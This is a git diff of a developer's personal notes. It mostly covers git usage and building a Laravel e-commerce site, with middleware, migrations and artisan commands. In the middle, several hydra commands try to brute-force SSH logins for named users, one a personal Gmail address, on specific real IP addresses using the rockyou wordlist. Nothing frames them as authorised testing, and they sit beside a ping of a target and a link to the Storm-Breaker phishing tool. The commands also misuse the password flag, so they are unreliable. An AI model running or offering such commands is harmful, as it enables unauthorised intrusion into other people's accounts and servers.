@@ -43,11 +43,21 @@ git status
 git merge
 git stash
 git add README.md
-git commit -m "12-03-2025"
+git commit -m "Initial Commit"
 git branch -M main
-git remote add origin https://github.com/ali321213/lrvl_crud.git
+git remote add origin https://github.com/ali321213/Oredoo_Blog.git
 git push -u origin main
 git add .
+
+Option 3: Force Overwrite (Not Recommended)
+If you don’t need your local changes and want to discard them:
+
+bash
+Copy
+Edit
+git reset --hard HEAD
+git pull origin main
+Warning: This will permanently delete your local changes.
 
 
 📌 Correct Migration Order
@@ -229,8 +239,6 @@ Additional Features
 
 This structure covers the essential components of an e-commerce platform, including user management, product catalog, orders, payments, attributes, shopping cart, reviews, and additional features like coupons and wishlists. You can further customize and expand this structure based on your specific requirements.
 
-
-=============================================================================================================================================================
 =============================================================================================================================================================
 To implement cart functionality in a Laravel e-commerce store, you can follow these steps based on the search results:
 
@@ -411,46 +419,15 @@ $ hydra -l <username> -p <password> <server> <service>
 $ hydra -l aesthetic_fellow_ -p /usr/share/wordlists/rockyou.txt 157.240.227.174 ssh
 $ hydra -l aesthetic_fellow_ -p /usr/share/wordlists/rockyou.txt 157.240.3.174 ssh
 $ hydra -l aesthetic_fellow_ -p /usr/share/wordlists/rockyou.txt 2a03:2880:f267:e5:face:b00c:0:4420 ssh
-
-
+$ hydra -l jose.fairforest@gmail.com -p /usr/share/wordlists/rockyou.txt 57.144.148.1 ssh
 
 2a03:2880:f267:e5:face:b00c:0:4420
-          157.240.227.174
-
+157.240.227.174
 ping 157.240.227.174
-
-
 
 https://github.com/ultrasecurity/Storm-Breaker
 
 apt install python3-requests python3-colorama python3-psutil
-
-
-After generating the middleware, register it in app/Http/Kernel.php inside the $routeMiddleware array:
-protected $routeMiddleware = [
-    'auth' => \App\Http\Middleware\AuthMiddleware::class,
-    'admin' => \App\Http\Middleware\AdminMiddleware::class,
-    'customer' => \App\Http\Middleware\CustomerMiddleware::class,
-];
-
-
-Apply the middleware to specific routes in routes/web.php:
-
-Route::middleware(['auth'])->group(function () {
-    Route::resource('orders', OrderController::class);
-});
-
-Route::middleware(['admin'])->group(function () {
-    Route::resource('categories', CategoryController::class);
-    Route::resource('brands', BrandController::class);
-    Route::resource('products', ProductController::class);
-});
-
-Route::middleware(['customer'])->group(function () {
-    Route::post('/reviews', [ReviewController::class, 'store'])->name('reviews.store');
-});
-
-
 
 <!-- @foreach($banners as $index => $banner)
 <div class="carousel-item {{ $index == 0 ? 'active' : '' }}">
@@ -462,8 +439,6 @@ Route::middleware(['customer'])->group(function () {
 <link rel="stylesheet" href="{{ asset('') }}">
 <script src="{{asset('')}}"></script>
 
-
-
 php artisan make:factory ProductImageFactory
 php artisan make:factory UnitFactory
 php artisan make:factory BrandFactory
@@ -472,4 +447,6 @@ php artisan make:factory CategoryFactory
 php artisan route:list
 
 php artisan serve
+php artisan serve --port=8001
+php artisan serve --port=8002
 npm run dev
